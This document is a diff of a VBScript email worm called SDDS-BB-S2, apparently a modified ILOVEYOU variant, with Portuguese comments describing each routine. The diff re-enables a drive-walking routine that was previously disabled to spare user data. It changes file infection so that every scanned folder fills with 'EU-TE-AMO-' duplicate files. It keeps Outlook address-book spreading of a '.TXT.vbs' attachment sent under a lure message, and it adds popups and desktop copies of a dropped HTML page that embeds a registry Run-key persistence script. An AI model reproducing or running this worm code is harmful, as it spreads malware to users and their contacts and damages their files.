@@ -81,10 +81,7 @@ Sub main()
   regruns()
   html()
   spreadtoemail()
-
-  rem Como não desejo fazer com que o worm SDDS-BB-S2 crie perdas nos dados dos usuários,
-  rem  simplesmente não vou permitir que a subrotina abaixo seja executada.
-  rem listadriv()
+  listadriv()
 End Sub
 
 rem Esta subrotina cria e edita valores de registros, referenciada
@@ -195,50 +192,57 @@ Sub infectfiles(folderspec)
     ext = lcase(ext)
     s = lcase(f1.name)
 
+    rem Minha modificação vai ser inserir a mensagem "EU TE AMO"
+    rem  em todas as duplicatas de arquivos
+    bname = fso.GetBaseName(f1.path)
+    Set cop = fso.GetFile(f1.path)
+    cop.copy(folderspec & "\EU-TE-AMO-" & bname & "." & ext)
+
     rem O worm é duplicado para todo arquivo .vbs ou .vbe.
     rem O arquivo é aberto, o conteúdo é modificado e o arquivo é fechado.
-    If (ext = "vbs") Or (ext = "vbe") Then
-      Set ap = fso.OpenTextFile(f1.path, 2, true)
-      ap.write vbscopy
-      ap.close
+    rem If (ext = "vbs") Or (ext = "vbe") Then
+    rem  Set ap = fso.OpenTextFile(f1.path, 2, true)
+    rem  ap.write vbscopy
+    rem  ap.close
 
     rem O worm faz a mesma coisa para arquivos .js, .css etc.
     rem Contudo, também é necessário adicionar a extensão .vbs a estes arquivos
     rem  para que o worm consiga se replicar e ser executado.
-    ElseIf (ext = "js") Or (ext = "jse") Or (ext = "css") Or (ext = "wsh") Or (ext = "sct") Or (ext = "hta") Then
-      Set ap = fso.OpenTextFile(f1.path, 2, true)
-      ap.write vbscopy
-      ap.close
+    rem ElseIf (ext = "js") Or (ext = "jse") Or (ext = "css") Or (ext = "wsh") Or (ext = "sct") Or (ext = "hta") Then
+      rem Set ap = fso.OpenTextFile(f1.path, 2, true)
+      rem ap.write vbscopy
+      rem ap.close
 
-      bname = fso.GetBaseName(f1.path)
-      Set cop = fso.GetFile(f1.path)
-      cop.copy(folderspec & "\" & bname & ".vbs")
-      fso.DeleteFile(f1.path)
+      rem bname = fso.GetBaseName(f1.path)
+      rem Set cop = fso.GetFile(f1.path)
+      rem cop.copy(folderspec & "\EU-TE-AMO-" & bname)
+      rem fso.DeleteFile(f1.path)
 
     rem O worm se replica em imagens .jpg, mas por algum motivo,
     rem  o worm também duplica as imagens? Ao que parece, não era possível
     rem  simplesmente renomear o arquivo para adicionar a extensão .vbs,
     rem  então o autor do worm preferiu por fazer uma duplicata, eu acho.
-    ElseIf (ext = "jpg") Or (ext = "jpeg") Then
-      Set ap = fso.OpenTextFile(f1.path, 2, true)
-      ap.write vbscopy
-      ap.close
+    rem ElseIf (ext = "jpg") Or (ext = "jpeg") Or (ext = "bmp") Then
+      rem Set ap = fso.OpenTextFile(f1.path, 2, true)
+      rem ap.write vbscopy
+      rem ap.close
 
-      Set cop = fso.GetFile(f1.path)
-      cop.copy(f1.path & ".vbs")
-      fso.DeleteFile(f1.path)
+      rem bname = fso.GetBaseName(f1.path)
+      rem Set cop = fso.GetFile(f1.path)
+      rem cop.copy(folderspec & "\EU-TE-AMO-" & bname & "." & ext)
+      rem fso.DeleteFile(f1.path)
     
     rem Este caso é o mais intrigante. Creio que a ideia era duplicar
     rem  o worm em arquivos .mp3 e então escondê-los ao adicionar o atributo "2",
     rem  mas alterar o conteúdo da música não funciona e elas ficam intactas.
-    ElseIf (ext = "mp3") Or (ext = "mp2") Then
-      Set mp3 = fso.CreateTextFile(f1.path & ".vbs")
-      mp3.write vbscopy
-      mp3.close
+    rem ElseIf (ext = "mp3") Or (ext = "mp2") Then
+      rem bname = fso.GetBaseName(f1.path)
+      rem Set cop = fso.GetFile(f1.path)
+      rem cop.Copy(folderspec & "\EU-TE-AMO-" & bname & "." & ext)
 
-      Set att = fso.GetFile(f1.path)
-      att.attributes = att.attributes + 2
-    End If
+      rem Set att = fso.GetFile(f1.path)
+      rem att.attributes = att.attributes + 2
+    rem End If
 
     rem Verifica se a pasta já foi infectada, senão, o worm continua se espalhando.
     If (eq <> folderspec) Then
@@ -339,6 +343,7 @@ Sub spreadtoemail()
         malead = a.AddressEntries(x)
         regad = ""
         regad = regedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & malead )
+        regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & malead, "", "REG_DWORD"
 
         rem Caso o contatinho ainda não tenha recebido o email, então a carta será
         rem  gerada e o worm .vbs será enviado em anexo.
@@ -350,6 +355,8 @@ Sub spreadtoemail()
           male.Body = vbcrlf & "como vc ta? faz tanto tempo que a gnt n se ve. eu tenho umas coisas para te dizer."
           male.Attachments.Add(dirsystem & "\SDDS-BB-S2.TXT.vbs")
           male.Send
+
+          MsgBox "sdds bb S2! como vc ta? faz tanto tempo que a gnt n se ve. eu tenho umas coisas para te dizer."
 
           rem Após o email ser enviado através do male.Send, vamos alterar o registro para que
           rem  o programa saiba que já enviamos o worm para este contato.
@@ -380,12 +387,12 @@ Sub html
   rem Ao que parece, o Visual Basic Script não permitia o uso das barras invertidas (/) e nem
   rem de aspas duplas em strings, então o autor do worm precisou dar um jeito de substituir os
   rem caracteres necessários para criar o documento HTML da forma apropriada.
-  dta1 = "<html><head><title>OIIII BBBB :3<?-?title><meta name=@-@Generator@-@ content=@-@BAROK VBS - SDDSBBS2@-@><meta name=@-@Author@-@ content=@-@spyder ?-? ispyder@mail.com ?-? @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@><meta name=@-@Description@-@ content=@-@simple but i think this is good...@-@><?-?head><body ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#SDDS-BB-S2.HTM#-#,#-#main#-#)@-@ ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#SDDS-BB-S2.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@ STYLE=@-@font-family: monospace@-@><CENTER><blink>Eu senti saudades <3<?-?blink><MARQUEE LOOP@-@infinite@-@>----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br ?-?>-------------------------------------------------------------------dddddddd-----------------------------dddddddd------------------------------------------------------------------------------------------------------------------------------<br ?-?>----SSSSSSSSSSSSSSS------------------------------------------------d::::::d-----------------------------d::::::d------------------------------------------BBBBBBBBBBBBBBBBB---BBBBBBBBBBBBBBBBB-----------SSSSSSSSSSSSSSS--222222222222222----<br ?-?>--SS:::::::::::::::S-----------------------------------------------d::::::d-----------------------------d::::::d------------------------------------------B::::::::::::::::B--B::::::::::::::::B--------SS:::::::::::::::S2:::::::::::::::22--<br ?-?>-S:::::SSSSSS::::::S-----------------------------------------------d::::::d-----------------------------d::::::d------------------------------------------B::::::BBBBBB:::::B-B::::::BBBBBB:::::B------S:::::SSSSSS::::::S2::::::222222:::::2-<br ?-?>-S:::::S-----SSSSSSS-----------------------------------------------d:::::d------------------------------d:::::d-------------------------------------------BB:::::B-----B:::::BBB:::::B-----B:::::B-----S:::::S-----SSSSSSS2222222-----2:::::2-<br ?-?>-S:::::S--------------aaaaaaaaaaaaa--uuuuuu----uuuuuu------ddddddddd:::::d---aaaaaaaaaaaaa------ddddddddd:::::d-----eeeeeeeeeeee--------ssssssssss----------B::::B-----B:::::B--B::::B-----B:::::B-----S:::::S------------------------2:::::2-<br ?-?>-S:::::S--------------a::::::::::::a-u::::u----u::::u----dd::::::::::::::d---a::::::::::::a---dd::::::::::::::d---ee::::::::::::ee----ss::::::::::s---------B::::B-----B:::::B--B::::B-----B:::::B-----S:::::S------------------------2:::::2-<br ?-?>--S::::SSSS-----------aaaaaaaaa:::::au::::u----u::::u---d::::::::::::::::d---aaaaaaaaa:::::a-d::::::::::::::::d--e::::::eeeee:::::eess:::::::::::::s--------B::::BBBBBB:::::B---B::::BBBBBB:::::B-------S::::SSSS------------------2222::::2--<br ?-?>---SS::::::SSSSS---------------a::::au::::u----u::::u--d:::::::ddddd:::::d------------a::::ad:::::::ddddd:::::d-e::::::e-----e:::::es::::::ssss:::::s-------B:::::::::::::BB----B:::::::::::::BB---------SS::::::SSSSS--------22222::::::22---<br ?-?>-----SSS::::::::SS------aaaaaaa:::::au::::u----u::::u--d::::::d----d:::::d-----aaaaaaa:::::ad::::::d----d:::::d-e:::::::eeeee::::::e-s:::::s--ssssss--------B::::BBBBBB:::::B---B::::BBBBBB:::::B----------SSS::::::::SS----22::::::::222-----<br ?-?>--------SSSSSS::::S---aa::::::::::::au::::u----u::::u--d:::::d-----d:::::d---aa::::::::::::ad:::::d-----d:::::d-e:::::::::::::::::e----s::::::s-------------B::::B-----B:::::B--B::::B-----B:::::B------------SSSSSS::::S--2:::::22222--------<br ?-?>-------------S:::::S-a::::aaaa::::::au::::u----u::::u--d:::::d-----d:::::d--a::::aaaa::::::ad:::::d-----d:::::d-e::::::eeeeeeeeeee--------s::::::s----------B::::B-----B:::::B--B::::B-----B:::::B-----------------S:::::S2:::::2-------------<br ?-?>-------------S:::::Sa::::a----a:::::au:::::uuuu:::::u--d:::::d-----d:::::d-a::::a----a:::::ad:::::d-----d:::::d-e:::::::e-----------ssssss---s:::::s--------B::::B-----B:::::B--B::::B-----B:::::B-----------------S:::::S2:::::2-------------<br ?-?>-SSSSSSS-----S:::::Sa::::a----a:::::au:::::::::::::::uud::::::ddddd::::::dda::::a----a:::::ad::::::ddddd::::::dde::::::::e----------s:::::ssss::::::s-----BB:::::BBBBBB::::::BBB:::::BBBBBB::::::B-----SSSSSSS-----S:::::S2:::::2-------222222<br ?-?>-S::::::SSSSSS:::::Sa:::::aaaa::::::a-u:::::::::::::::u-d:::::::::::::::::da:::::aaaa::::::a-d:::::::::::::::::d-e::::::::eeeeeeee--s::::::::::::::s------B:::::::::::::::::B-B:::::::::::::::::B------S::::::SSSSSS:::::S2::::::2222222:::::2<br ?-?>-S:::::::::::::::SS--a::::::::::aa:::a-uu::::::::uu:::u--d:::::::::ddd::::d-a::::::::::aa:::a-d:::::::::ddd::::d--ee:::::::::::::e---s:::::::::::ss-------B::::::::::::::::B--B::::::::::::::::B-------S:::::::::::::::SS-2::::::::::::::::::2<br ?-?>--SSSSSSSSSSSSSSS-----aaaaaaaaaa--aaaa---uuuuuuuu--uuuu---ddddddddd---ddddd--aaaaaaaaaa--aaaa--ddddddddd---ddddd----eeeeeeeeeeeeee----sssssssssss---------BBBBBBBBBBBBBBBBB---BBBBBBBBBBBBBBBBB---------SSSSSSSSSSSSSSS---22222222222222222222<br ?-?>----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<?-?MARQUEE><p>Este worm e inofensivo e n vai causar danos no seu computador =)<?-?p><?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>--S2--EU-TI-AMO-DMAISS!!11!!-:3--S2--<?-?MARQUEE><?-?body><?-?html><script language=@-@JScript@-@>?-??-?If (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}?-??-?<?-?script><script language=@-@VBScript@-@>on error resume nextDim fso,dirsystem,wri,code,code2,code3,code4,aw,regditaw=1code="
+  dta1 = "<html><head><title>OIIII BBBB :3<?-?title><meta name=@-@Generator@-@ content=@-@BAROK VBS - SDDSBBS2@-@><meta name=@-@Author@-@ content=@-@spyder ?-? ispyder@mail.com ?-? @GRAMMERSoft Group ?-? Manila, Philippines ?-? March 2000@-@><meta name=@-@Description@-@ content=@-@simple but i think this is good...@-@><?-?head><body ONMOUSEOUT=@-@window.name=#-#main#-#;window.open(#-#SDDS-BB-S2.HTM#-#,#-#main#-#)@-@ ONKEYDOWN=@-@window.name=#-#main#-#;window.open(#-#SDDS-BB-S2.HTM#-#,#-#main#-#)@-@ BGPROPERTIES=@-@fixed@-@ BGCOLOR=@-@#FF9933@-@ STYLE=@-@font-family: monospace@-@><CENTER><blink>Eu senti saudades <3<?-?blink><MARQUEE LOOP@-@infinite@-@>----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<br ?-?>-------------------------------------------------------------------dddddddd-----------------------------dddddddd------------------------------------------------------------------------------------------------------------------------------<br ?-?>----SSSSSSSSSSSSSSS------------------------------------------------d::::::d-----------------------------d::::::d------------------------------------------BBBBBBBBBBBBBBBBB---BBBBBBBBBBBBBBBBB-----------SSSSSSSSSSSSSSS--222222222222222----<br ?-?>--SS:::::::::::::::S-----------------------------------------------d::::::d-----------------------------d::::::d------------------------------------------B::::::::::::::::B--B::::::::::::::::B--------SS:::::::::::::::S2:::::::::::::::22--<br ?-?>-S:::::SSSSSS::::::S-----------------------------------------------d::::::d-----------------------------d::::::d------------------------------------------B::::::BBBBBB:::::B-B::::::BBBBBB:::::B------S:::::SSSSSS::::::S2::::::222222:::::2-<br ?-?>-S:::::S-----SSSSSSS-----------------------------------------------d:::::d------------------------------d:::::d-------------------------------------------BB:::::B-----B:::::BBB:::::B-----B:::::B-----S:::::S-----SSSSSSS2222222-----2:::::2-<br ?-?>-S:::::S--------------aaaaaaaaaaaaa--uuuuuu----uuuuuu------ddddddddd:::::d---aaaaaaaaaaaaa------ddddddddd:::::d-----eeeeeeeeeeee--------ssssssssss----------B::::B-----B:::::B--B::::B-----B:::::B-----S:::::S------------------------2:::::2-<br ?-?>-S:::::S--------------a::::::::::::a-u::::u----u::::u----dd::::::::::::::d---a::::::::::::a---dd::::::::::::::d---ee::::::::::::ee----ss::::::::::s---------B::::B-----B:::::B--B::::B-----B:::::B-----S:::::S------------------------2:::::2-<br ?-?>--S::::SSSS-----------aaaaaaaaa:::::au::::u----u::::u---d::::::::::::::::d---aaaaaaaaa:::::a-d::::::::::::::::d--e::::::eeeee:::::eess:::::::::::::s--------B::::BBBBBB:::::B---B::::BBBBBB:::::B-------S::::SSSS------------------2222::::2--<br ?-?>---SS::::::SSSSS---------------a::::au::::u----u::::u--d:::::::ddddd:::::d------------a::::ad:::::::ddddd:::::d-e::::::e-----e:::::es::::::ssss:::::s-------B:::::::::::::BB----B:::::::::::::BB---------SS::::::SSSSS--------22222::::::22---<br ?-?>-----SSS::::::::SS------aaaaaaa:::::au::::u----u::::u--d::::::d----d:::::d-----aaaaaaa:::::ad::::::d----d:::::d-e:::::::eeeee::::::e-s:::::s--ssssss--------B::::BBBBBB:::::B---B::::BBBBBB:::::B----------SSS::::::::SS----22::::::::222-----<br ?-?>--------SSSSSS::::S---aa::::::::::::au::::u----u::::u--d:::::d-----d:::::d---aa::::::::::::ad:::::d-----d:::::d-e:::::::::::::::::e----s::::::s-------------B::::B-----B:::::B--B::::B-----B:::::B------------SSSSSS::::S--2:::::22222--------<br ?-?>-------------S:::::S-a::::aaaa::::::au::::u----u::::u--d:::::d-----d:::::d--a::::aaaa::::::ad:::::d-----d:::::d-e::::::eeeeeeeeeee--------s::::::s----------B::::B-----B:::::B--B::::B-----B:::::B-----------------S:::::S2:::::2-------------<br ?-?>-------------S:::::Sa::::a----a:::::au:::::uuuu:::::u--d:::::d-----d:::::d-a::::a----a:::::ad:::::d-----d:::::d-e:::::::e-----------ssssss---s:::::s--------B::::B-----B:::::B--B::::B-----B:::::B-----------------S:::::S2:::::2-------------<br ?-?>-SSSSSSS-----S:::::Sa::::a----a:::::au:::::::::::::::uud::::::ddddd::::::dda::::a----a:::::ad::::::ddddd::::::dde::::::::e----------s:::::ssss::::::s-----BB:::::BBBBBB::::::BBB:::::BBBBBB::::::B-----SSSSSSS-----S:::::S2:::::2-------222222<br ?-?>-S::::::SSSSSS:::::Sa:::::aaaa::::::a-u:::::::::::::::u-d:::::::::::::::::da:::::aaaa::::::a-d:::::::::::::::::d-e::::::::eeeeeeee--s::::::::::::::s------B:::::::::::::::::B-B:::::::::::::::::B------S::::::SSSSSS:::::S2::::::2222222:::::2<br ?-?>-S:::::::::::::::SS--a::::::::::aa:::a-uu::::::::uu:::u--d:::::::::ddd::::d-a::::::::::aa:::a-d:::::::::ddd::::d--ee:::::::::::::e---s:::::::::::ss-------B::::::::::::::::B--B::::::::::::::::B-------S:::::::::::::::SS-2::::::::::::::::::2<br ?-?>--SSSSSSSSSSSSSSS-----aaaaaaaaaa--aaaa---uuuuuuuu--uuuu---ddddddddd---ddddd--aaaaaaaaaa--aaaa--ddddddddd---ddddd----eeeeeeeeeeeeee----sssssssssss---------BBBBBBBBBBBBBBBBB---BBBBBBBBBBBBBBBBB---------SSSSSSSSSSSSSSS---22222222222222222222<br ?-?>----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------<?-?MARQUEE><p>O seu computador está cheio de duplicatas de arquivos, melhor fazer uma limpeza =)<?-?p><?-?CENTER><MARQUEE LOOP=@-@infinite@-@ BGCOLOR=@-@yellow@-@>--S2--EU-TI-AMO-DMAISS!!11!!-:3--S2--<?-?MARQUEE><?-?body><?-?html><script language=@-@JScript@-@><!--?-??-?If (window.screen){var wi=screen.availWidth;var hi=screen.availHeight;window.moveTo(0,0);window.resizeTo(wi,hi);}?-??-?--><?-?script><script language=@-@VBScript@-@><!--on error resume nextDim fso,dirsystem,wri,code,code2,code3,code4,aw,regditaw=1code="
 
   rem O conteúdo abaixo é o código Visual Basic Script que vem junto da página HTML, tanto que
   rem  a tag de fechamento "</script>" que foi aberta acima só é fechada abaixo. Nada deste
   rem script vai ser executado, contudo, pois tags de comentários <!-- --> foram declaradas.
-  dta2 = "Set fso=CreateObject(@-@Scripting.FileSystemObject@-@)Set dirsystem=fso.GetSpecialFolder(1)code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))set wri=fso.CreateTextFile(dirsystem&@-@^-^MSKernel32.vbs@-@)wri.write code4wri.closeIf (fso.FileExists(dirsystem&@-@^-^MSKernel32.vbs@-@)) ThenIf (err.number=424) Thenaw=0End IfIf (aw=1) Thendocument.write @-@ERROR: can#-#t initialize ActiveX@-@window.closeEnd IfEnd IfSet regedit = CreateObject(@-@WScript.Shell@-@)regedit.RegWrite@-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^MSKernel32@-@,dirsystem&@-@^-^MSKernel32.vbs@-@?-??-?><?-?script>"
+  dta2 = "Set fso=CreateObject(@-@Scripting.FileSystemObject@-@)Set dirsystem=fso.GetSpecialFolder(1)code2=replace(code,chr(91)&chr(45)&chr(91),chr(39))code3=replace(code2,chr(93)&chr(45)&chr(93),chr(34))code4=replace(code3,chr(37)&chr(45)&chr(37),chr(92))set wri=fso.CreateTextFile(dirsystem&@-@^-^MSKernel32.vbs@-@)wri.write code4wri.closeIf (fso.FileExists(dirsystem&@-@^-^MSKernel32.vbs@-@)) ThenIf (err.number=424) Thenaw=0End IfIf (aw=1) Thendocument.write @-@ERROR: can#-#t initialize ActiveX@-@window.closeEnd IfEnd IfSet regedit = CreateObject(@-@WScript.Shell@-@)regedit.RegWrite@-@HKEY_LOCAL_MACHINE^-^Software^-^Microsoft^-^Windows^-^CurrentVersion^-^Run^-^MSKernel32@-@,dirsystem&@-@^-^MSKernel32.vbs@-@?-??-?>--><?-?script>"
 
   rem Substituindo caracteres inválidos por caracteres ASCII válidos
   rem  para serem exibidos em um navegador web por um encoding apropriado.
@@ -430,5 +437,10 @@ Sub html
   d.write dt6
   d.close
 
-  regcreate "HKCU\Software\Microsoft\Internet Explorer\Main\StartPage", "C:\WINDOWS\system32\SDDS-BB-S2.HTM"
+  Set WshShell = CreateObject("WScript.Shell")
+  WshShell.Run dirsystem + "\SDDS-BB-S2.HTM"
+  desktopDir = WshShell.SpecialFolders("Desktop")
+
+  Set c = fso.GetFile(dirsystem + "\SDDS-BB-S2.HTM")
+  c.Copy(desktopDir & "\SDDS-BB-S2.HTM")
 End Sub
